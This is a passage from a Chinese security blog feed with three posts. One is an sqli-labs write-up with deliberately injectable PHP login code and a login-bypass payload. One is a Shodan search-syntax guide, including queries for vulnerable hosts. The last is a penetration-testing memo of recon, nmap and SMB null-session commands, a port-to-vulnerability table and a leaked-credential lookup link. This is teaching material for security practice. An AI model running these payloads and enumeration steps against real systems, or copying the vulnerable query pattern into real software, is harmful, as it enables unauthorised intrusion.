class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line">&lt;div align=<span class="string">"right"</span>&gt;</span><br><span class="line">&lt;a style=<span class="string">"font-size:.8em;color:#FFFF00"</span> href=<span class="string">'index.php'</span>&gt;&lt;img src=<span class="string">"../images/Home.png"</span> height=<span class="string">'45'</span>; width=<span class="string">'45'</span>&gt;&lt;/br&gt;HOME&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/db-creds.inc"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span><span class="params">($host,$dbuser,$dbpass, $dbname)</span></span>&#123;</span><br><span class="line">   <span class="comment">// connectivity</span></span><br><span class="line"><span class="comment">//mysql connections for stacked query examples.</span></span><br><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);</span><br><span class="line">   </span><br><span class="line">   $username = mysqli_real_escape_string($con1, $_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">   $password = $_POST[<span class="string">"login_password"</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Check connection</span></span><br><span class="line">   <span class="keyword">if</span> (mysqli_connect_errno($con1))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"Failed to connect to MySQL: "</span> . mysqli_connect_error();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       @mysqli_select_db($con1, $dbname) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">"Unable to connect to the database ######: "</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* execute multi query */</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   $sql = <span class="string">"SELECT * FROM users WHERE username=('$username') and password=('$password')"</span>;</span><br><span class="line">   <span class="keyword">if</span> (@mysqli_multi_query($con1, $sql))</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="comment">/* store first result set */</span></span><br><span class="line">      <span class="keyword">if</span>($result = @mysqli_store_result($con1))</span><br><span class="line">      &#123;</span><br><span class="line"> <span class="keyword">if</span>($row = @mysqli_fetch_row($result))</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($row[<span class="number">1</span>])</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$login = sqllogin($host,$dbuser,$dbpass, $dbname);</span><br><span class="line"><span class="keyword">if</span> (!$login== <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">$_SESSION[<span class="string">"username"</span>] = $login;</span><br><span class="line">setcookie(<span class="string">"Auth"</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);  <span class="comment">/* expire in 15 Minutes */</span></span><br><span class="line">header(<span class="string">'Location: logged-in.php'</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;tr&gt;&lt;td colspan=<span class="string">"2"</span> style=<span class="string">"text-align:center;"</span>&gt;&lt;br/&gt;&lt;p style=<span class="string">"color:#FF0000;"</span>&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/slap1.jpg"</span>&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>和43关的代码一样….<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:admin&apos;)or(&apos;1&apos;)|(&apos;1</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/08/kNMfqf.png" alt="kNMfqf.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Shodan summary</title>
      <link href="/posts/645c6642.html"/>
      <url>/posts/645c6642.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>这篇文章是看了某前辈的文章所写的，感觉shodan还是很强<br>前辈的文章链接：<a href="http://b404.xyz/2018/02/08/Shodan-Manual/" target="_blank" rel="noopener">Shodan手册</a></p><h3 id="shodan总结"><a href="#shodan总结" class="headerlink" title="shodan总结"></a>shodan总结</h3><p><b>介绍</b></p><hr><blockquote><p>shodan是一个搜索互联网连接设备的搜索引擎，不同于谷歌，必应，百度这些搜索引擎。用户可以在shodan上使用shodan搜索语法找到连接互联网的摄像头、路由器、服务器等设备信息。在渗透测试中，是个很不错的神器<br>Shodan的搜索流程：<br><img src="http://b404.xyz/img/shodan/1517795894244.png" alt=""></p></blockquote><p><b>声明</b></p><hr><p>此文章的来源是：<a href="http://b404.xyz/2018/02/08/Shodan-Manual/#search%E5%91%BD%E4%BB%A4" target="_blank" rel="noopener">Shodan手册</a>，学习了前辈的知识并加以总结</p><p><b>正文</b></p><hr><blockquote><p>Banner shodan采集的基本数据单是banner，banner是描述设备所运行服务的标志性文本信息。对于web服务器来说，其将返回标题或是telnet登录界面。banner的内容因服务类型的不同而异。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br><span class="line">Date: Thu, 07 Feb 2019 15:18:05 GMT</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Keep-Alive: timeout=60</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Server: nginx</span><br><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure><blockquote><p>从上面的banner显示，该设备正运行着nginx web服务器软件</p></blockquote><p>下面是S7工控系统协议的一个banner，这个banner详细了很多。CPU的类型，序列号都列了出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Copyright: Original Siemens Equipment</span><br><span class="line">PLC name: S7_Turbine</span><br><span class="line">Module type: CPU 313C</span><br><span class="line">Unknown (129): Boot Loader           A%</span><br><span class="line">Module: 6ES7 313-5BG04-0AB0  v.0.5</span><br><span class="line">Basic Firmware: v.3.3.11</span><br><span class="line">Module name: CPU 313C</span><br><span class="line">Serial number of module: S Q-F2U049162015</span><br><span class="line">Plant identification: </span><br><span class="line">Basic Hardware: 6ES7 313-5BG04-0AB0  v.0.5</span><br></pre></td></tr></table></figure></p><blockquote><p>shodan搜索的是互联网的banner，如果只搜索指定的IP那么信息出现将很多。如果是搜索特定服务，那么不会出现其他的结果</p></blockquote><p>shodan的分布式爬虫：<br>爬虫分布于世界各地，包括：</p><ul><li>美国（东海岸和西海岸）</li><li>中国</li><li>冰岛</li><li>法国</li><li>台湾</li><li>越南</li><li>罗马尼亚</li><li>捷克共和国</li></ul><p>shodan的基本算法是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">生成一个随机的IPv4地址</span><br><span class="line">从Shodan能解析的端口列表中生成一个随机端口测试</span><br><span class="line">检测随机端口上的随机IPv4地址，并获取Banner</span><br><span class="line">继续步骤1</span><br></pre></td></tr></table></figure></p><p>漏洞测试：<br>比如https的心脏滴血漏洞，如果存在心脏滴血漏洞。在调用shodan的API所返回的banner里，有CVE-2014-0160,如果不存在则是!CVE-2014-0160<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;opts&quot;: &#123;</span><br><span class="line">        &quot;heartbleed&quot;: &quot;... 174.142.92.126:8443 - VULNERABLE\n&quot;,</span><br><span class="line">        &quot;vulns&quot;: [&quot;CVE-2014-0160&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>搜索美国有心脏滴血的服务country:US vuln:CVE-2014-0160<br>莫得高级会员的我= =#</p><p>语法的使用：<br>搜索开放了445端口的中国服务器：country:CN port:445<br><img src="https://s2.ax1x.com/2019/02/08/ktX9oQ.md.png" alt="ktX9oQ.md.png"></p><p>注意：搜索语法要用“”，例如：country:”CN”<br>搜索中国所有联网的设备：city:”China”<br><img src="https://s2.ax1x.com/2019/02/08/ktXVyV.png" alt="ktXVyV.png"></p><p>搜索开放了端口135,445的：port:”135,445”<br><img src="https://s2.ax1x.com/2019/02/08/ktXuo4.md.png" alt="ktXuo4.md.png"></p><p>用·排除搜索结果:port:”135,445” -country:”CN”<br><img src="https://s2.ax1x.com/2019/02/08/ktXQY9.md.png" alt="ktXQY9.md.png"></p><p>有时候也需要过滤一些标题为空的:port:”80” -hash:0<br><img src="https://s2.ax1x.com/2019/02/08/ktX3S1.png" alt="ktX3S1.png"></p><blockquote><p>Shodan上的每个banner都有一个哈希值，对于空的banner，hash值就为0。若尝试搜索简短的、静态的banner，使用哈希过滤语法就比较便捷。</p></blockquote><p>shodan常用的过滤器：</p><table><thead><tr><th>过滤器名</th><th>描述</th><th>举例</th></tr></thead><tbody><tr><td>category</td><td>现有的分类：</td><td>ics, malware    category:”malware”</td></tr><tr><td>city</td><td>城市的名字</td><td>city:”San Diego”</td></tr><tr><td>country</td><td>国家简写</td><td>country:”ES” country:”CN”</td></tr><tr><td>net</td><td>CIDR格式的IP地址</td><td>net:190.30.40.0/24</td></tr><tr><td>hostname</td><td>主机名或域名</td><td>hostname:”google”</td></tr><tr><td>port</td><td>端口号</td><td>port:21</td></tr><tr><td>org</td><td>组织或公司</td><td>org:”google”</td></tr><tr><td>isp</td><td>ISP供应商</td><td>isp:”China Telecom”</td></tr><tr><td>product</td><td>软件、平台</td><td>product:”Apache httpd” product:”openssh”</td></tr><tr><td>os</td><td>操作系统</td><td>os:”Windows 7 or 8”</td></tr><tr><td>version</td><td>软件版本</td><td>version:”2.6.1”</td></tr><tr><td>geo</td><td>经纬度</td><td>geo:”46.9481,7.4474”</td></tr></tbody></table><p>下载<br>完成搜索后，还能 下载搜索结果，不过这都是有钱人才能下载的，需要积分才能下载<br><img src="https://s2.ax1x.com/2019/02/08/ktjyC9.png" alt="ktjyC9.png"></p><p>继续例子：<br>搜索开放了8080端口，服务是IIS，位于美国的服务器：port:”8080” product:”Microsoft-IIS” country:”US” version:”6.0”<br><img src="https://s2.ax1x.com/2019/02/08/ktjHgI.md.png" alt="ktjHgI.md.png"></p><p>搜索可能受到DOUBLEPULSAR攻击的机器：port:”445” “SMB Version:1” os:”Windows”<br><img src="https://s2.ax1x.com/2019/02/08/ktve54.png" alt="ktve54.png"></p><p>搜索所有apache服务的baidu：”apache hostname:”baidu.com”<br><img src="https://s2.ax1x.com/2019/02/08/ktv0Mt.png" alt="ktv0Mt.png"></p><p>通过hash来搜索：<br>ping一下baidu的IP<br><img src="https://s2.ax1x.com/2019/02/08/ktvsZ8.png" alt="ktvsZ8.png"></p><p>shodan搜索此IP查看原始数据<br><img src="https://s2.ax1x.com/2019/02/08/ktvydS.png" alt="ktvydS.png"></p><p>获取hash<br><img src="https://s2.ax1x.com/2019/02/08/ktv6Ig.png" alt="ktv6Ig.png"></p><p>通过hash搜索：http.favicon.hash:”    -1215187578”<br><img src="https://s2.ax1x.com/2019/02/08/ktv7oF.png" alt="ktv7oF.png"></p><p>data.1.http.favicon.data的值是base64,可以自行验证<br><img src="https://s2.ax1x.com/2019/02/08/ktxSeK.png" alt="ktxSeK.png"></p><p>通过未知的icon搜索目标<br>首先要计算icon的hash值，然后在查询<br>由于mmh3这个库在windows下要安装VS才能成功安装，这里我就不示范了<br><img src="https://s2.ax1x.com/2019/02/08/kNSRRH.md.png" alt="kNSRRH.md.png"></p><p>地图搜索：<br>地图shodan：<a href="https://maps.shodan.io" target="_blank" rel="noopener">Shodan Maps</a><br><img src="https://s2.ax1x.com/2019/02/08/kNSLWQ.md.png" alt="kNSLWQ.md.png"></p><p>Exploit漏洞利用shodan搜索：<a href="https://exploits.shodan.io" target="_blank" rel="noopener">Shodan Exploits</a><br><img src="https://s2.ax1x.com/2019/02/08/kNSxLq.png" alt="kNSxLq.png"></p><p>图片搜索shodan：<a href="https://images.shodan.io" target="_blank" rel="noopener">Shodan - Account Management</a><br>此处莫得截图，要钱才能访问。。。。</p><p>shodan搜索截图：has_screenshot:true country:”KR”<br><img src="https://s2.ax1x.com/2019/02/08/kNpiYF.png" alt="kNpiYF.png"></p><p>shodan共享搜索语法：<a href="https://www.shodan.io/explore" target="_blank" rel="noopener">Shodan - Explore the Internet</a><br><img src="https://s2.ax1x.com/2019/02/08/kNpQYD.png" alt="kNpQYD.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里能找到很多东西，游戏服务器也能找到</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/08/kN9tgJ.md.png" alt="kN9tgJ.md.png"></p><p>常用的语法：<br><img src="https://s2.ax1x.com/2019/02/08/kNEUJ0.png" alt="kNEUJ0.png"></p><p><img src="https://s2.ax1x.com/2019/02/08/kNEDL4.png" alt="kNEDL4.png"></p><p><img src="https://s2.ax1x.com/2019/02/08/kNEyw9.png" alt="kNEyw9.png"></p><p><img src="https://s2.ax1x.com/2019/02/08/kNVV6U.png" alt="kNVV6U.png"></p><p><img src="https://s2.ax1x.com/2019/02/08/kNVZXF.png" alt="kNVZXF.png"></p><p><img src="https://s2.ax1x.com/2019/02/08/kNVmm4.png" alt="kNVmm4.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Penetration test memo, incomplete version</title>
      <link href="/posts/b2490e91.html"/>
      <url>/posts/b2490e91.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>总结还没写完，头有点疼。。。可能是昨天晚上喝酒的缘故<br><img src="https://5b0988e595225.cdn.sohucs.com/images/20181107/99216fba9eff4c12af6947df9c7b5de0.jpeg" alt=""></p><h2 id="渗透测试的备忘"><a href="#渗透测试的备忘" class="headerlink" title="渗透测试的备忘"></a>渗透测试的备忘</h2><p><b>信息收集</b><br>whois查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whois 域名</span><br><span class="line">例如：whois baidu.com</span><br><span class="line">在线查询：https://www.aizhan.com，http://whois.domaintools.com,https://whois.icann.org</span><br></pre></td></tr></table></figure></p><p>真实IP查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.DNS查询获得</span><br><span class="line">  dig a 域名</span><br><span class="line">  例如：dig a baidu.com</span><br><span class="line">2.查询DNS历史记录获得或者在线查询 （并不准确）</span><br><span class="line">  http://whois.domaintools.com</span><br><span class="line">3.通过超级ping找出真实IP</span><br><span class="line"> http://ping.chinaz.com/</span><br></pre></td></tr></table></figure></p><p>DNS查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dnsenum 域名 会自动检查DNS区域传输</span><br><span class="line">例如：dnsenum baidu.com</span><br><span class="line">dig a xxx.com 查询a记录</span><br><span class="line">dig mx xxx.com 查询mx记录</span><br><span class="line">dig axfr xxx.com DNS区传输域检查</span><br><span class="line">dnsrecon -r xxx.com</span><br><span class="line">在线DNS查询推荐的站点：https://dnsdumpster.com/</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/06/kYylE4.md.png" alt="kYylE4.md.png"></p><p>DNS区域检查<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dnsenum xxx.com</span><br><span class="line">dig axfr xxx.com</span><br><span class="line">nslookup -&gt; set type=any -&gt; ls -d xxx.com</span><br></pre></td></tr></table></figure></p><p>邮箱查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">google搜索：iintext:xxxx@qq.com</span><br><span class="line">reg007查询：https://reg007.com/</span><br><span class="line">推荐工具查询，此工具在google上搜索：https://github.com/killswitch-GUI/SimplyEmail</span><br><span class="line">社工库：http://site2.sjk.space/</span><br></pre></td></tr></table></figure></p><p>指纹查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -v 192.168.1.1 80</span><br><span class="line">云悉：http://www.yunsee.cn/</span><br><span class="line">whatweb http://xxx.com #获取web指纹</span><br></pre></td></tr></table></figure></p><p>子域名查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Lasy子域名挖掘机</span><br><span class="line">自己写的：https://github.com/422926799/Subdomain-blasting</span><br><span class="line">ip138子域名查询：http://site.ip138.com/ip138.com/domain.htm</span><br><span class="line">子域名光速查询接口：http://sbd.ximcx.cn/?#</span><br></pre></td></tr></table></figure></p><p>端口扫描与CVE漏洞查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chrome shodan插件：https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap/related</span><br><span class="line">shodan查询：https://www.shodan.io/</span><br><span class="line">zoomeye查询：https://www.zoomeye.org/</span><br></pre></td></tr></table></figure></p><p>nmap端口扫描<br>|命令|描述|<br>|—–|—|<br>|nmap -v -sS -A -T4 IP|Nmap详细扫描，运行syn stealth，T4计时（在LAN上应该没问题），操作系统和服务版本信息，traceroute和针对服务的脚本<br>|nmap -v -sS -p 1-65535 -A -T4 IP|扫描TCP全端口，更全面，但时间也很久<br>|nmap -v -sU -sS -p 1-65535 -A -T4|扫描TCP全部端口和UDP全部端口，更全面，但时间也更久<br>|nmap -v -sU -sS -P 1-65535 -A –script=auth,vuln IP|扫描全端口并自动测试端口漏洞<br>|根据扫描出的端口使用对应的脚本进行测试|根据扫描出的端口使用对应的脚本进行测试</p><p>nmap UDP扫描<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU &lt;target&gt;</span><br></pre></td></tr></table></figure></p><p>UDP扫描程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/portcullislabs/udp-proto-scanner.git</span><br></pre></td></tr></table></figure></p><p>扫描所有服务的IP地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -f ip.txt</span><br></pre></td></tr></table></figure></p><p>扫描特定的UDP服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">udp-proto-scanner.pl -p ntp -f ips.txt</span><br></pre></td></tr></table></figure></p><p>其他主机发现（C段查询）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.3.0/24 从ARP发现子网上的IP （实在不靠谱）</span><br><span class="line">fping -ag 192.168.3.0/24 发现存活IP</span><br><span class="line">在线查询：http://www.webscan.cc/</span><br><span class="line">whatweb --no-errors IP/24</span><br></pre></td></tr></table></figure></p><p>旁站查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.webscan.cc/</span><br></pre></td></tr></table></figure></p><p>端口漏洞对应列表：<br>|序号|分类|端口|服务|漏洞<br>|—-|—-|——-|—–|—–<br>|1| 中间件 |6379 |Redis |未授权访问<br>|2 |中间件 |8161 |Apache Group ActiveMQ |远程代码执行<br>|3 |中间件 |873 |Rsync |远程代码执行<br>|4| 中间件 |9001 |Supervisor |远程命令执行漏洞。<br>|5| 中间件 |4899 |Radmin |密码爆破2）远程命令执行<br>|6 |中间件 |2181 |Zookeeper |未授权访问<br>|7 |中间件 |11211| memcached|未授权访问<br>|8 |中间件 |2375 |Docker |未授权访问<br>|9 |中间件 |7001/7002| weblogic |密码爆破2）Java反序列化漏洞3）任意文件泄漏<br>|10| 中间件| 8080 |Resin |目录遍历2）远程文件读取<br>|11 |中间件 |8080 |GlassFish|弱口令2）任意文件读取3）认证绕过<br>|12 |中间件 |9990 |jboss |密码爆破2）远程代码执行3）Java反序列化<br>|13 |中间件 |9043| Websphere|密码爆破2）任意文件泄露3）java反序列化<br>|14| 中间件| 80/81/443 |IIS |PUT写文件2）ms150343）http.sys内存下载4）解析漏洞5）短文件名泄漏<br>|15 |中间件 |80/8080 |Apache |解析漏洞2）目录遍历3）任意文件上传4）密码爆破<br>|16| 中间件| 80/8080| Tomcat|爆破，远程代码执行漏洞，绕过漏洞等一系列安全漏洞<br>|17 |中间件 |80/8080 |Nginx |整数溢出2）目录遍历下载3）文件类型解析漏洞<br>|18 |中间件 |8080/8089| Jenkins|口令爆破2）未授权访问3）反序列化<br>|19| 服务类 |161 |SNMP|未授权访问<br>|20 |服务类| 443 |HTTPS服务|SSL心脏滴血<br>|21 |服务类 |2049| NFS |未授权访问<br>|22 |服务类 |445|Samba-NetBIOS服务|MS17-010漏洞2）MS06-040漏洞3) 病毒入口<br>|23 |服务类| 135|RPC(远程过程调用)服务|利用RPC漏洞攻击计算机2）病毒入口<br>|24 |服务类| 139 |Samba-文件和打印共享|IPC$共享后的空链接漏洞2）病毒入口<br>|25 |服务类| 137 |Samba-NetBIOS 名字服务|利用RPC漏洞攻击计算机2）病毒入口3)暴力破解<br>|26 |服务类| 3389| Windows远程连接|Shift粘滞键后门2）密码爆破3)利用ms12-020攻击3389端口<br>|27 |服务类| 22 |SSH |密码爆破2)防火墙SSH后门3)OpenSSL漏洞<br>|28 |服务类| 23 |telnet |使用明文传输技术-嗅探2)暴力破解<br>|29 |服务类| 53 |DNS |远程溢出2)DNS欺骗攻击3)拒绝服务攻击4）DNS域传送信息泄露5）DNS劫持6）DNS缓存投毒7）DNS隧道技术刺穿防火墙<br>|30 |服务类| 389| LDAP|注入2）未授权访问3）弱密码<br>|31 |数据库| 1521| oracle|各种版本的漏洞2）密码爆破3）远程溢出<br>|32 |数据库| 1433 |SQLServer|各种版本的漏洞2）密码爆破3）远程溢出<br>|33 |数据库| 3306 |mysql|各种版本的漏洞2）密码爆破3）自定义函数<br>|34 |其他软件| 5631| symantecpcanywhere|各种版本的漏洞<br>|35 |其他软件| 5900/5900|VNC|密码验证绕过2）拒绝服务攻击3）权限提升4）密码爆破<br>|36 |其他软件| 8649| ganglia|未授权访问<br>|37 |其他软件| 5632 |Pcanywhere|提权控制服务：2）拒绝服务攻击：3）代码执行<br>|38 |其他软件| 21| FTP |远程溢出2）暴力破解3）匿名访问—未授权访问4）配置不当，直接 cd / &amp;&amp; dir5）使用明文传输技术-嗅探6）后门技术7）跳转攻击<br>|39 |其他软件 |81| ipcam|暴力破解2）可以基于NTP的反射和放大攻击3）NTP反射型doos攻击</p><p>扫描敏感目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wwwscan</span><br><span class="line">御剑</span><br></pre></td></tr></table></figure></p><p><b>漏洞挖掘</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">寻找对应的中间件漏洞</span><br><span class="line">nikto -h xxx.com</span><br><span class="line">AWVS扫描</span><br><span class="line">Burp配置好后自动化扫描</span><br><span class="line">APPSCAN扫描</span><br><span class="line">暴力破解表单</span><br><span class="line">尝试万能密码绕过登录</span><br><span class="line">测试错误的配置服务</span><br><span class="line">寻找对应的CMS漏洞</span><br><span class="line">尝试逻辑漏洞挖掘：如短信轰炸，0元购买</span><br><span class="line">越权漏洞</span><br><span class="line">有框就测试注入和xss</span><br><span class="line">有表单就爆破</span><br><span class="line">有短信发送的就尝试有没有短信轰炸的</span><br><span class="line">url有id的就测试注入</span><br><span class="line">有狗能绕则绕，不能绕就扔掉</span><br><span class="line">抓包如果有类似json数据的多注意一下修改一下值看看有什么变化</span><br></pre></td></tr></table></figure></p><p><b>枚举网络攻击服务</b><br>samba枚举<br>smb枚举工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmblookup -A target</span><br><span class="line">smbclient //MOUNT/share -I target -N</span><br><span class="line">rpcclient -U &quot;&quot; target</span><br><span class="line">enum4linux target</span><br></pre></td></tr></table></figure></p><p>指纹smb版<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //ip</span><br></pre></td></tr></table></figure></p><p>查找开放的SMB<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -T4 -oA shares --script smb-enum-shares --script-args smbuser=&lt;username&gt;,smbpass=&lt;password&gt; -p 445 IP/24</span><br></pre></td></tr></table></figure></p><p>枚举SMB用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sS --script=smb-enum-users -p U:137,T:139 x.x.x.2-254</span><br></pre></td></tr></table></figure></p><p>RID枚举域用户（Windows server 2003起作用）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ridenum IP 500 50000 dict.txt</span><br></pre></td></tr></table></figure></p><p>用于RID枚举的metasploit模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_lookupsid</span><br></pre></td></tr></table></figure></p><p>空会话测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows:net use \\&lt;TARGET&gt;\IPC$ &quot;&quot; /u:&quot;&quot;</span><br><span class="line">Linux:smbclient -L //IP</span><br></pre></td></tr></table></figure></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
